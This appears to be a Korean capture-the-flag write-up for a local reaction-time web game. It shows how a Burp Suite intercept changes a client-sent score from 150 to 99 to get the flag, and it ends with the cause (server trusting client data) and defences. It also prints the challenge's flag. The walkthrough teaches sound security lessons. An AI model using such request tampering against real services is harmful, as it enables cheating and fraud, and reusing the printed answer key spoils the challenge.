# 1. 문제 분석
## 1.1 문제 설명
반응속도를 테스트하는 웹 게임  
100ms 미만의 반응속도를 달성하면 플래그 획득 가능  
클라이언트-서버 통신을 통해 기록을 검증  

# 2. 취약점 분석
## 2.1 통신 구조 확인
- 클라이언트(JavaScript)에서 반응 속도 측정
- 측정된 시간을 서버(PHP)로 전송
- 서버에서 플래그 반환 여부 결정

## 2.2 취약점 발견
- 클라이언트에서 서버로 전송되는 score 값 조작 가능
- 서버 측에서 충분한 검증 없이 score 값 신뢰
- HTTP 요청 변조를 통한 공격 가능

# 3. Burp Suite를 이용한 공격
## 3.1 Burp Suite 설정
1. Proxy 탭에서 Intercept 켜기
2. 브라우저에서 Burp Suite 프록시 설정
3. 게임 페이지 로드 및 통신 감시

## 3.2 요청 분석
```http
POST /question6.php HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 13

{"score": 150}
```

## 3.3 요청 변조
1. Intercept 기능으로 POST 요청 캡처
2. score 값을 99로 변조:
```http
POST /question6.php HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 12

{"score": 99}
```
3. 변조된 요청 전송

## 3.4 응답 확인
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
    "success": true,
    "message": "점수가 저장되었습니다.",
    "score": 99,
    "flag": "FLAG{F4st_R3fl3x_M4st3r}"
}
```

# 4. 취약점 원인
## 4.1 클라이언트 측 검증 한계
- JavaScript로 측정된 시간은 조작 가능
- 클라이언트에서 생성된 데이터는 신뢰할 수 없음

## 4.2 서버 측 검증 부재
- 비정상적인 반응 시간에 대한 검증 부족
- 클라이언트 데이터를 그대로 신뢰

# 5. 대응 방안
## 5.1 서버 측 검증 강화
- 비정상적인 반응 시간 필터링
- 연속된 요청에 대한 제한
- 클라이언트 행동 패턴 분석

## 5.2 보안 기능 추가
- 요청에 대한 서명 검증
- 시간 기반 토큰 사용
- 서버 측에서 타임스탬프 검증

# 6. 최종 플래그
```
FLAG{F4st_R3fl3x_M4st3r}
```